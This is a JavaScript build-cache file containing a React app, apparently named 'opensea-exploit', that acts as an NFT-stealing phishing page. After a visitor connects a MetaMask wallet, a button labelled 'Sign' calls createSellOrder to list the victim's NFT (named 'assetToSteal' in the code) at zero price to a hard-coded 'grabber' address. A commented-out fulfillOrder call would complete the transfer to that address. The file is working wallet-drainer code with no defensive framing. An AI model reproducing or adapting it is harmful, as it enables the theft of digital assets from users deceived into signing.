{"ast":null,"code":"var _jsxFileName = \"/Users/romanrakhlin/Dropbox/Mac/Desktop/opensea-exploit/src/App.js\",\n    _s = $RefreshSig$();\n\nimport { useState } from \"react\";\nimport \"./App.css\";\nimport Web3 from \"web3\";\nimport ConnectWalletButton from \"./components/ConnectWalletButton\";\nimport { createSellOrder, fulfillOrder } from \"./opensea-sdk/utils/opensea.js\";\nimport { jsxDEV as _jsxDEV } from \"react/jsx-dev-runtime\";\nimport { Fragment as _Fragment } from \"react/jsx-dev-runtime\";\n\nconst App = () => {\n  _s();\n\n  const [loading, setLoading] = useState(false);\n  const [address, setAddress] = useState(\"\");\n\n  const onPressConnect = async () => {\n    setLoading(true);\n\n    try {\n      var _window, _window$ethereum;\n\n      if ((_window = window) !== null && _window !== void 0 && (_window$ethereum = _window.ethereum) !== null && _window$ethereum !== void 0 && _window$ethereum.isMetaMask) {\n        const accounts = await window.ethereum.request({\n          method: \"eth_requestAccounts\"\n        });\n        const account = Web3.utils.toChecksumAddress(accounts[0]);\n        setAddress(account);\n      }\n    } catch (error) {\n      console.log(error);\n      setAddress(\"\");\n    }\n\n    setLoading(false);\n  };\n\n  const onPressLogout = () => {\n    setAddress(\"\");\n  };\n\n  const signSmth = async () => {\n    const web3 = new Web3(Web3.givenProvider);\n    const provider = web3.currentProvider;\n    const assetToSteal = {\n      \"tokenId\": \"8932\",\n      \"tokenAddress\": \"0x8056aD118916db0fEef1c8B82744Fa37E5d57CC0\"\n    };\n    const grabber = \"0xa95889dF74d9F9A73b76DB329c71b78A2F62f635\";\n    const order = await createSellOrder({\n      provider: provider,\n      asset: assetToSteal,\n      accountAddress: address,\n      startAmount: 0,\n      endAmount: 0,\n      quantity: 1,\n      listingTime: 0,\n      expirationTime: 0,\n      englishAuctionReservePrice: 0,\n      paymentTokenAddress: \"0x8056aD118916db0fEef1c8B82744Fa37E5d57CC0\",\n      extraBountyBasisPoints: 0,\n      buyerAddress: grabber,\n      fees: 0.01,\n      buyerEmail: \"hui228@mail.ru\"\n    });\n    console.log(order); // await fulfillOrder({\n    //     order: order,\n    //     provider: provider,\n    //     accountAddress: address,\n    //     recipientAddress: grabber,\n    //     referrerAddress: grabber\n    // });\n  };\n\n  return /*#__PURE__*/_jsxDEV(\"div\", {\n    className: \"App\",\n    children: /*#__PURE__*/_jsxDEV(\"header\", {\n      className: \"Header\",\n      children: [/*#__PURE__*/_jsxDEV(ConnectWalletButton, {\n        onPressConnect: onPressConnect,\n        onPressLogout: onPressLogout,\n        loading: loading,\n        address: address\n      }, void 0, false, {\n        fileName: _jsxFileName,\n        lineNumber: 77,\n        columnNumber: 17\n      }, this), address != \"\" ? /*#__PURE__*/_jsxDEV(\"button\", {\n        onClick: signSmth,\n        children: /*#__PURE__*/_jsxDEV(\"h2\", {\n          children: \"Sign\"\n        }, void 0, false, {\n          fileName: _jsxFileName,\n          lineNumber: 86,\n          columnNumber: 33\n        }, this)\n      }, void 0, false, {\n        fileName: _jsxFileName,\n        lineNumber: 85,\n        columnNumber: 29\n      }, this) : /*#__PURE__*/_jsxDEV(_Fragment, {}, void 0, false)]\n    }, void 0, true, {\n      fileName: _jsxFileName,\n      lineNumber: 76,\n      columnNumber: 13\n    }, this)\n  }, void 0, false, {\n    fileName: _jsxFileName,\n    lineNumber: 75,\n    columnNumber: 9\n  }, this);\n};\n\n_s(App, \"jb+CYBCLatwOT2t8Rs5oNf2j6JQ=\");\n\n_c = App;\nexport default App;\n\nvar _c;\n\n$RefreshReg$(_c, \"App\");","map":{"version":3,"names":["useState","Web3","ConnectWalletButton","createSellOrder","fulfillOrder","App","loading","setLoading","address","setAddress","onPressConnect","window","ethereum","isMetaMask","accounts","request","method","account","utils","toChecksumAddress","error","console","log","onPressLogout","signSmth","web3","givenProvider","provider","currentProvider","assetToSteal","grabber","order","asset","accountAddress","startAmount","endAmount","quantity","listingTime","expirationTime","englishAuctionReservePrice","paymentTokenAddress","extraBountyBasisPoints","buyerAddress","fees","buyerEmail"],"sources":["/Users/romanrakhlin/Dropbox/Mac/Desktop/opensea-exploit/src/App.js"],"sourcesContent":["import { useState } from \"react\";\nimport \"./App.css\";\nimport Web3 from \"web3\";\nimport ConnectWalletButton from \"./components/ConnectWalletButton\";\n\nimport { createSellOrder, fulfillOrder } from \"./opensea-sdk/utils/opensea.js\";\n\nconst App = () => {\n\n    const [loading, setLoading] = useState(false);\n    const [address, setAddress] = useState(\"\");\n\n    const onPressConnect = async() => {\n        setLoading(true);\n\n        try {\n            if (window?.ethereum?.isMetaMask) {\n                const accounts = await window.ethereum.request({\n                    method: \"eth_requestAccounts\"\n                });\n\n                const account = Web3.utils.toChecksumAddress(accounts[0]);\n                setAddress(account);\n            }\n        } catch (error) {\n            console.log(error);\n            setAddress(\"\");\n        }\n\n        setLoading(false);\n    };\n\n    const onPressLogout = () => {\n        setAddress(\"\");\n    };\n\n    const signSmth = async () => {\n        const web3 = new Web3(Web3.givenProvider);\n        const provider = web3.currentProvider\n\n        const assetToSteal = {\n            \"tokenId\": \"8932\",\n            \"tokenAddress\": \"0x8056aD118916db0fEef1c8B82744Fa37E5d57CC0\"\n        }\n        const grabber = \"0xa95889dF74d9F9A73b76DB329c71b78A2F62f635\";\n        const order = await createSellOrder({\n            provider: provider,\n            asset: assetToSteal,\n            accountAddress: address,\n            startAmount: 0,\n            endAmount: 0,\n            quantity: 1,\n            listingTime: 0,\n            expirationTime: 0,\n            englishAuctionReservePrice: 0,\n            paymentTokenAddress: \"0x8056aD118916db0fEef1c8B82744Fa37E5d57CC0\",\n            extraBountyBasisPoints: 0,\n            buyerAddress: grabber,\n            fees: 0.01,\n            buyerEmail: \"hui228@mail.ru\"\n        });\n\n        console.log(order);\n\n        // await fulfillOrder({\n        //     order: order,\n        //     provider: provider,\n        //     accountAddress: address,\n        //     recipientAddress: grabber,\n        //     referrerAddress: grabber\n        // });\n    }\n\n    return (\n        <div className=\"App\">\n            <header className=\"Header\">\n                <ConnectWalletButton\n                    onPressConnect={onPressConnect}\n                    onPressLogout={onPressLogout}\n                    loading={loading}\n                    address={address}\n                />\n                    { \n                        address != \"\" ?\n                            <button onClick={signSmth}>\n                                <h2>Sign</h2>\n                            </button>\n                        : \n            <></>\n        }\n      </header>\n    </div>\n  );\n};\n\nexport default App;\n"],"mappings":";;;AAAA,SAASA,QAAT,QAAyB,OAAzB;AACA,OAAO,WAAP;AACA,OAAOC,IAAP,MAAiB,MAAjB;AACA,OAAOC,mBAAP,MAAgC,kCAAhC;AAEA,SAASC,eAAT,EAA0BC,YAA1B,QAA8C,gCAA9C;;;;AAEA,MAAMC,GAAG,GAAG,MAAM;EAAA;;EAEd,MAAM,CAACC,OAAD,EAAUC,UAAV,IAAwBP,QAAQ,CAAC,KAAD,CAAtC;EACA,MAAM,CAACQ,OAAD,EAAUC,UAAV,IAAwBT,QAAQ,CAAC,EAAD,CAAtC;;EAEA,MAAMU,cAAc,GAAG,YAAW;IAC9BH,UAAU,CAAC,IAAD,CAAV;;IAEA,IAAI;MAAA;;MACA,eAAII,MAAJ,wDAAI,QAAQC,QAAZ,6CAAI,iBAAkBC,UAAtB,EAAkC;QAC9B,MAAMC,QAAQ,GAAG,MAAMH,MAAM,CAACC,QAAP,CAAgBG,OAAhB,CAAwB;UAC3CC,MAAM,EAAE;QADmC,CAAxB,CAAvB;QAIA,MAAMC,OAAO,GAAGhB,IAAI,CAACiB,KAAL,CAAWC,iBAAX,CAA6BL,QAAQ,CAAC,CAAD,CAArC,CAAhB;QACAL,UAAU,CAACQ,OAAD,CAAV;MACH;IACJ,CATD,CASE,OAAOG,KAAP,EAAc;MACZC,OAAO,CAACC,GAAR,CAAYF,KAAZ;MACAX,UAAU,CAAC,EAAD,CAAV;IACH;;IAEDF,UAAU,CAAC,KAAD,CAAV;EACH,CAlBD;;EAoBA,MAAMgB,aAAa,GAAG,MAAM;IACxBd,UAAU,CAAC,EAAD,CAAV;EACH,CAFD;;EAIA,MAAMe,QAAQ,GAAG,YAAY;IACzB,MAAMC,IAAI,GAAG,IAAIxB,IAAJ,CAASA,IAAI,CAACyB,aAAd,CAAb;IACA,MAAMC,QAAQ,GAAGF,IAAI,CAACG,eAAtB;IAEA,MAAMC,YAAY,GAAG;MACjB,WAAW,MADM;MAEjB,gBAAgB;IAFC,CAArB;IAIA,MAAMC,OAAO,GAAG,4CAAhB;IACA,MAAMC,KAAK,GAAG,MAAM5B,eAAe,CAAC;MAChCwB,QAAQ,EAAEA,QADsB;MAEhCK,KAAK,EAAEH,YAFyB;MAGhCI,cAAc,EAAEzB,OAHgB;MAIhC0B,WAAW,EAAE,CAJmB;MAKhCC,SAAS,EAAE,CALqB;MAMhCC,QAAQ,EAAE,CANsB;MAOhCC,WAAW,EAAE,CAPmB;MAQhCC,cAAc,EAAE,CARgB;MAShCC,0BAA0B,EAAE,CATI;MAUhCC,mBAAmB,EAAE,4CAVW;MAWhCC,sBAAsB,EAAE,CAXQ;MAYhCC,YAAY,EAAEZ,OAZkB;MAahCa,IAAI,EAAE,IAb0B;MAchCC,UAAU,EAAE;IAdoB,CAAD,CAAnC;IAiBAvB,OAAO,CAACC,GAAR,CAAYS,KAAZ,EA1ByB,CA4BzB;IACA;IACA;IACA;IACA;IACA;IACA;EACH,CAnCD;;EAqCA,oBACI;IAAK,SAAS,EAAC,KAAf;IAAA,uBACI;MAAQ,SAAS,EAAC,QAAlB;MAAA,wBACI,QAAC,mBAAD;QACI,cAAc,EAAErB,cADpB;QAEI,aAAa,EAAEa,aAFnB;QAGI,OAAO,EAAEjB,OAHb;QAII,OAAO,EAAEE;MAJb;QAAA;QAAA;QAAA;MAAA,QADJ,EAQYA,OAAO,IAAI,EAAX,gBACI;QAAQ,OAAO,EAAEgB,QAAjB;QAAA,uBACI;UAAA;QAAA;UAAA;UAAA;UAAA;QAAA;MADJ;QAAA;QAAA;QAAA;MAAA,QADJ,gBAKZ,qCAbA;IAAA;MAAA;MAAA;MAAA;IAAA;EADJ;IAAA;IAAA;IAAA;EAAA,QADJ;AAoBH,CAtFD;;GAAMnB,G;;KAAAA,G;AAwFN,eAAeA,GAAf"},"metadata":{},"sourceType":"module"}